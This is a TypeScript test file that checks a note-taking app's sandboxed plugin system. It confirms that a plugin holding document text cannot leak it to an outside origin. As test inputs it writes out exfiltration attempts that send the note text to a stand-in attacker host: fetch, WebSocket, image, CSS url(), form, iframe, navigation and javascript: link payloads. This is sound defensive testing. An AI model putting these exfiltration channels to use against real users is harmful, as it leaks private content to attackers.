/**
 * Plan 11.2 acceptance: "a plugin that tries to get content out — fetch,
 * WebSocket, an image, CSS, a form, an iframe or navigation to an outside
 * address — fails on every channel (a test for each)". One test per
 * channel, each through the real sandbox (QuickJS) and the real host: the
 * plugin holds the document text and every grant a panel plugin can have,
 * and tries to send it out on that channel. The request never happens, and
 * the app is handed nothing that could make one.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import { loadPlugin } from "../plugins/runtime/pluginHost";
import { grantsFrom } from "../plugins/runtime/capabilities";
import { parseManifest } from "../plugins/runtime/manifest";
import { validateUiTree } from "../plugins/runtime/uiTree";
import { fakePluginWorker } from "./helpers/pluginWorker";
import { __resetLedger, ledgerEntries } from "../ai/privacyLedger";
import { setAiPolicy } from "../ai/policy";

const SECRET = "secret note text";
const EVIL = "https://evil.example";

const manifest = parseManifest({
  schema: 1,
  id: "test.exfil",
  name: "Exfil",
  version: "0.1.0",
  description: "tries every channel out",
  author: "a",
  license: "MIT",
  main: "main.js",
  capabilities: [
    { id: "document:read", reason: "r" },
    { id: "panel", reason: "r" },
    { id: "renderer", reason: "r" },
    { id: "commands", reason: "r" },
    // A network grant for one origin: the evil origin is still not reachable.
    { id: "network:https://api.example.com", reason: "r" },
  ],
});
const GRANTS = ["document:read", "panel", "renderer", "commands", "network:https://api.example.com"];

/**
 * Runs `attempt` (plugin code: an async function body that has `text`, the
 * open note, and returns what happened) and gives back the plugin's report
 * plus every tree the app's panel was asked to show.
 */
async function tryChannel(attempt: string) {
  const rendered: unknown[] = [];
  const net = vi.fn();
  // The app's own fetches (QuickJS loading its wasm) go through; one to the evil origin would be the leak.
  const realFetch = globalThis.fetch;
  const evilCalls: string[] = [];
  const fetchSpy = vi.fn((u: RequestInfo | URL, o?: RequestInit) => {
    const url = String(u instanceof Request ? u.url : u);
    if (url.includes("evil.example")) {
      evilCalls.push(url);
      return Promise.resolve(new Response("leaked"));
    }
    return realFetch(u, o);
  });
  vi.stubGlobal("fetch", fetchSpy);
  const logs: string[] = [];
  const p = await loadPlugin({
    manifest,
    grants: grantsFrom(GRANTS),
    createWorker: fakePluginWorker,
    services: {
      "document.getText": async () => SECRET,
      "panel.open": async () => undefined,
      "panel.render": async (_p: unknown, tree: unknown) => void rendered.push(tree),
      "network.fetch": net,
    },
    // The attempt runs on an event, after the test listens to the plugin's console.
    code: `
      lumen.on("go", async () => {
        const text = await lumen.document.getText();
        try {
          const r = await (async () => { ${attempt} })();
          console.log("sent:" + JSON.stringify(r ?? null));
        } catch (e) {
          console.log("refused:" + (e && e.name) + ":" + (e && e.message));
        }
      });
    `,
  });
  p.onLog((_, t) => logs.push(t));
  p.emit("go");
  await vi.waitFor(() => expect(logs.length).toBe(1), { timeout: 5000 });
  await p.unload();
  vi.unstubAllGlobals();
  return { report: logs[0], rendered, net, evilCalls };
}

/** Nothing the app was handed can load anything from outside. */
function nothingOutside(rendered: unknown[], evilCalls: string[] = []) {
  expect(evilCalls).toEqual([]);
  const json = JSON.stringify(rendered);
  expect(json).not.toContain(EVIL);
  expect(json).not.toContain(SECRET);
}

beforeEach(() => {
  __resetLedger();
  localStorage.clear();
  setAiPolicy("local-first");
});

describe("plugin exfiltration, one channel at a time (plan 11.2)", () => {
  it("fetch: there is no fetch in the sandbox, and lumen.network.fetch to another origin is refused without a request", async () => {
    const bare = await tryChannel(`return fetch("${EVIL}/?d=" + encodeURIComponent(text));`);
    expect(bare.report).toMatch(/^refused:ReferenceError:/);
    const viaApi = await tryChannel(`return lumen.network.fetch("${EVIL}/?d=" + encodeURIComponent(text));`);
    expect(viaApi.report).toMatch(/^refused:PluginDenied:/);
    for (const r of [bare, viaApi]) {
      expect(r.net).not.toHaveBeenCalled();
      expect(r.evilCalls).toEqual([]);
    }
    // Not even a "blocked" entry: the request was never made.
    expect(ledgerEntries()).toHaveLength(0);
  });

  it("WebSocket: there is no WebSocket, EventSource or XMLHttpRequest in the sandbox", async () => {
    for (const ctor of ["WebSocket", "EventSource", "XMLHttpRequest"]) {
      const r = await tryChannel(`const s = new ${ctor}("${EVIL.replace("https", ctor === "WebSocket" ? "wss" : "https")}/"); s.send?.(text); return "opened";`);
      expect(r.report, ctor).toMatch(/^refused:ReferenceError:/);
      expect(r.evilCalls).toEqual([]);
    }
  });

  it("image: an <img> element, or an image URL in a field, never reaches the panel", async () => {
    const elem = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "img", src: "${EVIL}/p.png?d=" + text });`);
    expect(elem.report).toMatch(/^refused:/);
    const field = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "text", text: "x", src: "${EVIL}/p.png?d=" + text });`);
    expect(field.report).toMatch(/^refused:/);
    nothingOutside([...elem.rendered, ...field.rendered]);
    expect(() => validateUiTree({ type: "box", children: [{ type: "img", src: `${EVIL}/p.png` }] })).toThrow(/unknown element kind/);
  });

  it("CSS: a <style> element or a style field with url() is refused", async () => {
    const elem = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "style", text: "body{background:url(${EVIL}/?d=" + text + ")}" });`);
    expect(elem.report).toMatch(/^refused:/);
    const field = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "box", style: "background:url(${EVIL}/?d=" + text + ")", children: [] });`);
    expect(field.report).toMatch(/^refused:/);
    nothingOutside([...elem.rendered, ...field.rendered]);
  });

  it("form: a <form> with an outside action is refused; a button has no action or href", async () => {
    const elem = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "form", action: "${EVIL}/", children: [{ type: "input", id: "d", value: text }] });`);
    expect(elem.report).toMatch(/^refused:/);
    const button = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "button", id: "go", label: "Go", formAction: "${EVIL}/?d=" + text });`);
    expect(button.report).toMatch(/^refused:/);
    nothingOutside([...elem.rendered, ...button.rendered]);
  });

  it("iframe: an <iframe> (or object/embed) element is refused", async () => {
    for (const type of ["iframe", "object", "embed"]) {
      const r = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "${type}", src: "${EVIL}/?d=" + text });`);
      expect(r.report, type).toMatch(/^refused:/);
      nothingOutside(r.rendered);
    }
  });

  it("navigation: no location or window.open in the sandbox, and a note link to an outside address is refused", async () => {
    const loc = await tryChannel(`location.href = "${EVIL}/?d=" + text; return "navigated";`);
    expect(loc.report).toMatch(/^refused:ReferenceError:/);
    const open = await tryChannel(`window.open("${EVIL}/?d=" + text); return "opened";`);
    expect(open.report).toMatch(/^refused:ReferenceError:/);
    const link = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "noteLink", target: "${EVIL}/?d=" + text });`);
    expect(link.report).toMatch(/^refused:/);
    const js = await tryChannel(`await lumen.panel.open({}); return lumen.panel.render({ type: "noteLink", target: "javascript:fetch('${EVIL}')" });`);
    expect(js.report).toMatch(/^refused:/);
    nothingOutside([...link.rendered, ...js.rendered]);
  });
});
